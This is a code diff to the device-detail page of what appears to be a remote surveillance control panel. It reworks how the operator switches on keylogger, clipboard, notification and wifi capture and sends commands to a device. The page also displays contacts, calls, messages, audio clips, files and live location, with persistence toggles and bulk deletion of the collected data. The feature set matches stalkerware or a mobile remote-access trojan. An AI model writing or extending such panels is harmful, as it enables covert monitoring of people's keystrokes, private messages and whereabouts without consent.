@@ -33,7 +33,19 @@ export default function DeviceDetailPage() {
   const [showTelemetryModal, setShowTelemetryModal] = useState(false);
   useEffect(() => { setTabPrefs(loadTabPrefs()); }, []);
 
-  const isTabEnabled = useCallback((tabId: string) => tabPrefs[tabId] === true, [tabPrefs]);
+  const {
+    telemetryConfig, setTelemetryConfig, persistenceStatus, updatePersistenceStatus, currentSsid,
+    notifications, keystrokes, clipboardItems, lockEvents, wifiNetworks,
+    fetchTelemetryData, clearModuleData, fetchConfig,
+  } = useDeviceTelemetry(deviceId);
+
+  const isTabEnabled = useCallback((tabId: string) => {
+    if (tabId === "notifications") return Boolean(telemetryConfig?.notifications);
+    if (tabId === "keylogger") return Boolean(telemetryConfig?.keylogger);
+    if (tabId === "clipboard") return Boolean(telemetryConfig?.clipboard);
+    if (tabId === "security") return Boolean(telemetryConfig?.wifi);
+    return tabPrefs[tabId] === true;
+  }, [tabPrefs, telemetryConfig]);
 
   const {
     device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
@@ -44,30 +56,32 @@ export default function DeviceDetailPage() {
     fetchTabData,
   } = useDeviceDetail(deviceId, isTabEnabled);
 
-  const {
-    telemetryConfig, setTelemetryConfig, persistenceStatus, updatePersistenceStatus, currentSsid,
-    notifications, keystrokes, clipboardItems, lockEvents, wifiNetworks,
-    fetchTelemetryData, clearModuleData, fetchConfig,
-  } = useDeviceTelemetry(deviceId);
-
-  const toggleTab = (tabId: string) => {
+  const toggleTab = async (tabId: string) => {
     const nextVal = !isTabEnabled(tabId);
-    const next = { ...tabPrefs, [tabId]: nextVal };
-    setTabPrefs(next); saveTabPrefs(next);
     const meta = getTabMeta(tabId);
-    if (nextVal) {
-      toast.request(meta.waitMsg, 7000);
-      if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
-      if (["notifications", "keylogger", "clipboard", "security"].includes(tabId)) {
+    if (["notifications", "keylogger", "clipboard", "security"].includes(tabId)) {
+      const fieldKey = tabId === "security" ? "wifi" : tabId;
+      const nextTelemetry = { ...telemetryConfig, [fieldKey]: nextVal };
+      setTelemetryConfig(nextTelemetry);
+      await fetch(`/api/devices/${deviceId}/telemetry-config`, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ telemetry_config: nextTelemetry }),
+      });
+      if (nextVal) {
+        toast.request(meta.waitMsg, 7000);
+        if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
         fetchTelemetryData(tabId);
         setTimeout(() => fetchTelemetryData(tabId), 2500);
-      } else {
+      } else { toast.info(`Auto-sync disabled for ${meta.name}`); }
+    } else {
+      const next = { ...tabPrefs, [tabId]: nextVal };
+      setTabPrefs(next); saveTabPrefs(next);
+      if (nextVal) {
+        toast.request(meta.waitMsg, 7000);
+        if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
         fetchTabData(tabId, true, true);
         setTimeout(() => fetchTabData(tabId, true, true), 3000);
-        setTimeout(() => fetchTabData(tabId, true, true), 6000);
-      }
-    } else {
-      toast.info(`Auto-fetch disabled for ${meta.name}`);
+      } else { toast.info(`Auto-fetch disabled for ${meta.name}`); }
     }
   };
 
@@ -148,44 +162,32 @@ export default function DeviceDetailPage() {
         isTabEnabled={isTabEnabled(activeTab)}
         onToggleTab={() => toggleTab(activeTab)}
         onFetchOnce={() => {
-          const meta = getTabMeta(activeTab);
-          toast.request(meta.waitMsg, 7000);
+          const meta = getTabMeta(activeTab); toast.request(meta.waitMsg, 7000);
           if (meta.cmd) sendCommand(meta.cmd, {}, meta.name, true);
           fetchConfig();
           if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
-            fetchTelemetryData(activeTab);
-            setTimeout(() => { fetchTelemetryData(activeTab); fetchConfig(); }, 2500);
+            fetchTelemetryData(activeTab); setTimeout(() => { fetchTelemetryData(activeTab); fetchConfig(); }, 2500);
           } else {
-            fetchTabData(activeTab, true, true);
-            setTimeout(() => { fetchTabData(activeTab, true, true); fetchConfig(); }, 3000);
-            setTimeout(() => { fetchTabData(activeTab, true, true); fetchConfig(); }, 6000);
+            fetchTabData(activeTab, true, true); setTimeout(() => { fetchTabData(activeTab, true, true); fetchConfig(); }, 3000);
           }
         }}
-        onToggleLiveMovement={handleToggleLiveMovement}
-        onSendCommand={sendCommand}
-        onDeleteCommand={handleDeleteCommand}
-        onBulkDeleteCommands={handleBulkDeleteCommands}
-        onDeleteContact={handleDeleteContact}
-        onDeleteCall={handleDeleteCall}
-        onDeleteMessage={handleDeleteMessage}
-        onDeleteApp={handleDeleteApp}
-        onDeleteFile={handleDeleteFile}
-        onBulkDeleteContacts={handleBulkDeleteContacts}
-        onBulkDeleteCalls={handleBulkDeleteCalls}
-        onBulkDeleteMessages={handleBulkDeleteMessages}
-        onBulkDeleteApps={handleBulkDeleteApps}
-        onBulkDeleteFiles={handleBulkDeleteFiles}
-        onUpdatePersistence={updatePersistenceStatus}
+        onToggleLiveMovement={handleToggleLiveMovement} onSendCommand={sendCommand}
+        onDeleteCommand={handleDeleteCommand} onBulkDeleteCommands={handleBulkDeleteCommands}
+        onDeleteContact={handleDeleteContact} onDeleteCall={handleDeleteCall}
+        onDeleteMessage={handleDeleteMessage} onDeleteApp={handleDeleteApp} onDeleteFile={handleDeleteFile}
+        onBulkDeleteContacts={handleBulkDeleteContacts} onBulkDeleteCalls={handleBulkDeleteCalls}
+        onBulkDeleteMessages={handleBulkDeleteMessages} onBulkDeleteApps={handleBulkDeleteApps}
+        onBulkDeleteFiles={handleBulkDeleteFiles} onUpdatePersistence={updatePersistenceStatus}
       />
 
       <DeviceTelemetryControlsModal
-        isOpen={showTelemetryModal}
-        onClose={() => setShowTelemetryModal(false)}
-        deviceId={deviceId}
-        initialConfig={telemetryConfig}
-        persistenceStatus={persistenceStatus}
-        onTogglePersistence={updatePersistenceStatus}
-        onSaved={(cfg) => setTelemetryConfig(cfg)}
+        isOpen={showTelemetryModal} onClose={() => setShowTelemetryModal(false)}
+        deviceId={deviceId} initialConfig={telemetryConfig} tabPrefs={tabPrefs}
+        persistenceStatus={persistenceStatus} onTogglePersistence={updatePersistenceStatus}
+        onSaved={(cfg, updatedTabPrefs) => {
+          setTelemetryConfig(cfg);
+          if (updatedTabPrefs) { setTabPrefs(updatedTabPrefs); saveTabPrefs(updatedTabPrefs); }
+        }}
       />
     </div>
   );
